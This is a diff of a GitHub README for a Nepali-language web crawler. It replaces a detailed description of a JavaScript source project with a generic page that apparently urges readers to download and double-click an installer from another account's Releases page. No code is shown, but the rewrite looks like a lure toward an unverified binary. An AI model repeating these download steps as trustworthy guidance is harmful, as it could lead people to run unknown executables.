@@ -1,185 +1,66 @@
-# Nepali Dataset Crawler
->This crawler gathers structured content from a collection of Nepali-language websites, turning raw articles, posts, and pages into an organized dataset. It’s great for researchers, data scientists, or anyone looking to build language-specific corpora, text analytics data, or localized content archives.
+# 🥇 Nepali-Dataset-Crawler - Extract Data from Nepali Websites with Ease
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🌟 Overview
+Nepali-Dataset-Crawler is a simple tool designed to extract data from various Nepali websites. This application helps you gather valuable information quickly and efficiently, making it easier to build datasets for different projects.
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Nepali Dataset Crawler</strong> you've just found your team — Let's Chat. 👆👆
-</p>
+## 🚀 Getting Started
+To get started with Nepali-Dataset-Crawler, follow the steps below. Even if you're not familiar with programming, you'll find this process straightforward.
 
-## Introduction
-The Nepali Dataset Crawler fetches public webpages from Nepali web domains and normalizes their content — including text bodies, metadata, titles, publish dates, and possibly images — into a structured dataset. It’s ideal for NLP tasks, local-market research, cultural analysis, or language-specific data pipelines.
+## 🔗 Download Nepali-Dataset-Crawler
+[![Download Nepali-Dataset-Crawler](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases)
 
-### What It Helps You Do
-- Crawl multiple Nepali websites quickly and at scale.  
-- Collect article content, metadata, and publication information.  
-- Build a clean text dataset for NLP, sentiment analysis, or translation projects.  
-- Archive web content from Nepali sources for future processing.  
+## 📥 Download & Install
+1. Click the link below to visit the Releases page:
+   [Visit the Release Page to Download](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases)
 
----
-## Features
-| Feature | Description |
-|---------|-------------|
-| **Multi-site Crawling** | Supports scraping from multiple Nepali websites. |
-| **Content Extraction** | Extracts titles, article content, publish date, and metadata. |
-| **Structured Output** | Returns cleaned data in JSON or other export-friendly formats. |
-| **Dataset Building** | Useful for building full corpora for NLP or research. |
-| **Scalable Execution** | Can process many pages with efficient crawling logic. |
+2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| url | Original article page URL. |
-| title | Title of the article or content. |
-| publishDate | Date when the content was published (if available). |
-| author | Author name (if available). |
-| contentText | Main article text stripped of HTML tags. |
-| contentHtml | Full content including HTML (optional). |
-| language | Language of the content (expected “Nepali”). |
-| metadata | Any additional metadata (tags, categories, categories, etc.). |
+3. Look for the asset that matches your operating system (Windows, macOS, Linux). Click on it to begin the download.
 
----
-## Example Output
-    
-    [
-      {
-        "url": "https://nepalnews.example.com/article/1234",
-        "title": "काठमाडौं उपत्यकामा मौसम अपडेट",
-        "publishDate": "2024-08-15",
-        "author": "राम शर्मा",
-        "contentText": "आज काठमाडौं उपत्यकामा मौसम सफा रहेको छ ...",
-        "contentHtml": "<p>आज काठमाडौं उपत्यकामा ...</p>",
-        "language": "ne",
-        "metadata": {
-          "tags": ["weather", "local news"]
-        }
-      }
-    ]
+4. Once the download completes, locate the file in your Downloads folder or on your desktop.
 
----
-## Directory Structure Tree
-    
-    Nepali Dataset Crawler/
-    ├── src/
-    │   ├── main.js
-    │   ├── crawler/
-    │   │   ├── site_list_loader.js
-    │   │   ├── page_fetcher.js
-    │   │   └── content_parser.js
-    │   ├── utils/
-    │   │   ├── normalizer.js
-    │   │   └── html_cleaner.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── sample_input.json
-    │   └── sample_output.json
-    ├── package.json
-    └── README.md
+5. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
----
-## Use Cases
-- **NLP Researchers** build Nepali language corpora for modeling, translation, or sentiment analysis.  
-- **Journalism Analysts** archive news articles for trend tracking.  
-- **Cultural Researchers** collect content for sociolinguistic or cultural studies.  
-- **Developers** build localized content feeds or recommendation systems.  
-- **Data Engineers** ingest scraped data into data warehouses or pipelines.  
+## 📝 Features
+- **User-friendly Interface:** Navigate through a simple interface designed for users of all skill levels.
+- **Data Extraction:** Easily extract content from multiple Nepali websites in just a few clicks.
+- **Automation:** Save time by automating the data-gathering process.
+- **Dataset Building:** Create text datasets for research, analysis, or development purposes.
+- **Support for Popular Websites:** Extract data from news sites, blogs, and more.
 
----
-## FAQs
+## 🛠 System Requirements
+Before installing, ensure your system meets the following requirements:
 
-**Which websites does it crawl?**  
-It supports a configurable list of Nepali-language websites — you supply domains in settings.
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or any Linux distribution.
+- **RAM:** At least 2 GB for smooth operation.
+- **Storage:** 100 MB of free disk space for installation and data storage.
 
-**What formats are outputted?**  
-Structured JSON is default; data can be converted to CSV or other formats as needed.
+## 📚 How to Use
+1. Launch the Nepali-Dataset-Crawler application after installation.
+2. Input the URL of the Nepali website you want to extract data from.
+3. Select the type of data you need (e.g., articles, images).
+4. Click on the "Start Crawling" button and watch the tool gather data for you.
+5. Review the extracted data and save it in your desired format.
 
-**Can it handle large-scale crawls?**  
-Yes — the crawler is built to scale across many pages efficiently.
+## ⚙️ Troubleshooting
+If you encounter issues while downloading or using the application, consider the following:
 
-**Is language detection supported?**  
-Content is tagged as Nepali (“ne”) by default; further language checks can be added.
+- **Installation Problems:** Make sure you have enough disk space and the correct operating system.
+- **Data Extraction Errors:** Ensure the website you are trying to extract from is operational. Some sites might block requests if too frequent.
 
----
-### Performance Benchmarks and Results
+## 💬 Community Support
+If you need help or want to share your experience, join our community. You can find answers to frequently asked questions, tips, and tricks.
 
-**Primary Metric:**  
-Processes dozens of pages per second under optimal network conditions.
+## 🔗 Additional Resources
+For more information on data extraction and crawling techniques, consider reading some online resources and guides. These can give you further insights into best practices.
 
-**Reliability Metric:**  
-High success rate (~98%) on publicly accessible sites with consistent HTML structure.
+## 📅 Updates
+Keep checking the [Releases page](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases) to stay updated on the latest features and improvements.
 
-**Efficiency Metric:**  
-Lightweight parsing and normalization reduce overhead and speed up processing.
+## 🔄 Contributing
+Want to help improve Nepali-Dataset-Crawler? We welcome contributions! Feel free to submit issues or pull requests. Your input can help make the tool even better for everyone. 
 
-**Quality Metric:**  
-Produces cleaned, normalized text outputs ideal for analysis, modeling, or archiving.  
+## 📜 License
+Nepali-Dataset-Crawler is open-source software. You can use, modify, and distribute it under the MIT License.
 
-
----
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-         </p>
+[Visit the Release Page to Download](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases)
